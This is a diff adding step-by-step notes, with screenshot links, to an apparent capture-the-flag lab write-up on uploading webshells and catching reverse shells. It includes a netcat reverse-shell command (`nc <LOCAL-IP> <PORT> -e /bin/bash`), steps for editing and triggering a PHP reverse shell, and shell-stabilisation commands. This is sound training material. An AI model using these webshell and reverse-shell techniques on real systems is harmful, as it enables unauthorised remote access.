@@ -638,9 +638,60 @@ The remainder of this task will consist of shell examples for you to try out on 
 
 * Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.
 
-	![task13-webshell](./images/task13-webshell.png)
+	1. Creat file webshell 
+
+		![task13-webshell](./images/task13-webshell.png)
+
+	2. Upload file to target machine via browser
+
+		![task13-upload-shell](./images/task13-upload-shell.png)
+
+	3. Set Netcat listener on our machine
+
+		![task13-listener](./images/task13-listener.png)
+
+	4. Excecute webshell on target machine via browser
+
+		![task13-exec-webshell](./images/task13-exec-webshell.png)
+
+	5. Get the shell on our machine
+
+		![task13-get-webshell](./images/task13-get-webshell.png)
 
 * Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.
+
+	1. Copy `php-reverse-shell.php` to our directory
+
+		![task13-copy-shell](./images/task13-copy-shell.png)
+
+	2. Edit IP and Port on file `php-reverse-shell.php` to IP and Port our Machine
+
+		![task13-edit-php](./images/task13-edit-php.png)
+
+	3. Upload file to to targer machine via browser upload 
+
+		![task13-get-webshell](./images/task13-get-webshell.png)
+
+	4. Set Netcat listener on our machine
+
+		![task13-listener](./images/task13-listener.png)
+
+	5. Open file upload `php-reverse-shell.php`
+
+		![task13-open-phpshell](./images/task13-open-phpshell.png)
+
+	6. Get the shell on our machine
+
+		![task13-get-phpshell](./images/task13-get-phpshell.png)
+
+	7. Netcat Shell Stabilisation
+
+		- python3 -c 'import pty;pty.spawn("/bin/bash")'
+		- export TERM=xterm
+		- background the shell using Ctrl + Z
+		- Back in our own terminal we use `stty raw -echo; fg`
+
+		![task13-stabilisation](./images/task13-stabilisation.png)
 
 * Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.
 
